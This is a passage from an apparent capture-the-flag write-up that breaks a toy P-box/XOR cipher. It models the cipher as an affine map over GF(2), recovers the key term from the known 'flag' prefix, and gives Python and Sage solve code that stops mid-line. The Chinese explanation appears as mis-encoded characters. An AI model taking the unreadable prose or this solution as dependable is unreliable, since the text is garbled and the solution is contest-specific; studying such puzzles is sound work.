class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">v</span>):</span><br><span class="line">    t=v</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">       q=[]</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> Pbox:</span><br><span class="line">           q.append(<span class="built_in">sum</span>([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> j])%<span class="number">2</span>)</span><br><span class="line">       t=[<span class="built_in">int</span>(q[j])^<span class="built_in">int</span>(i[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line">fb=<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="number">32</span>*<span class="number">8</span>)</span><br><span class="line">ciphertext=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fb),<span class="number">32</span>):</span><br><span class="line">    t=enc([<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> fb[i:i+<span class="number">32</span>]])</span><br><span class="line">    ciphertext+=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> t])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é€»è¾‘ï¼šå°†flagäºŒè¿›åˆ¶32*8ä½01ä¸²åˆ†ä¸º8ç»„ï¼Œæ¯ä¸€ç»„éƒ½å…ˆç»è¿‡Pç›’æŒ‰ä½é€‰æ‹©æ±‚å’Œè¿ç®—ï¼Œå†ä¸æœªçŸ¥çš„32ä½keyè¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ï¼Œå› ä¸ºæœ‰6ç»„keyï¼Œä¸Šè¿°ä¸¤æ­¥è¿ç®—å¾ªç¯è¿›è¡Œ6æ¬¡æ“ä½œï¼Œå¾—åˆ°æœ€ç»ˆ32ä½å¯†æ–‡ã€‚</p><p>å°†åŠ å¯†è¿‡ç¨‹è½¬ä¸º $\text{GF}(2)$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œ$M_i$ ä¸º 1x32 æ˜æ–‡çŸ©é˜µ $(0 \le i \lt 8)$ï¼Œ$P$ ä¸º 32x32 Pç›’çŸ©é˜µï¼Œ$K_i$ ä¸º 1x32 keyçŸ©é˜µ $(0 \le i \lt 6)$ï¼Œ$T_i$ ä¸ºä¸­é—´çŸ©é˜µ $(0 \le i \lt 6)$ï¼Œ$C$ ä¸ºå¯†æ–‡çŸ©é˜µï¼Œå³ï¼š</p><p>$T_0=M_i$</p><p>$T_1=T_0P^{-1}+K_0$</p><p>$T_2=T_1P^{-1}+K_1$</p><p>$T_3=T_2P^{-1}+K_2$</p><p>$T_4=T_3P^{-1}+K_3$</p><p>$T_5=T_4P^{-1}+K_4$</p><p>$T_6=T_5P^{-1}+K_5=C$</p><p>å¯å¾—ï¼š</p><p>$C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$</p><p>ç”±äº $K_i$ å’Œ $P$ éƒ½å›ºå®šï¼Œä»¤ $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ï¼Œ</p><p>æœ‰ $C=M_iA+B$ï¼Œå…¶ä¸­ $A,B$ éƒ½ä¸ºå›ºå®šå€¼ï¼Œ$A$ å¯æ±‚ï¼Œ$B$ æœªçŸ¥ã€‚</p><p>çŒœæµ‹ $M_0$ å¯¹åº”çš„æ˜æ–‡æ˜¯ <code>flag</code>ï¼Œåˆ™ç”± $M_0,C_0$å¯ä»¥å¾—å‡º $B$ï¼Œå†å¯¹ $C_1$ è‡³ $C_5$ åˆ†åˆ«æ±‚é€†è¿ç®—å¯å¾— $M_1$ è‡³ $M_5$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">P = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line">PP = zero_matrix(GF(<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    PP[k] = [<span class="number">1</span> <span class="keyword">if</span> x <span class="keyword">in</span> P[k] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">PPt = PP.transpose()</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;</span></span><br><span class="line">C = zero_matrix(GF(<span class="number">2</span>),<span class="number">8</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">32</span>):</span><br><span class="line">    C[k//<span class="number">32</span>] = [<span class="number">1</span> <span class="keyword">if</span> x == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> c[k:k+<span class="number">32</span>]]</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">f0 = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(<span 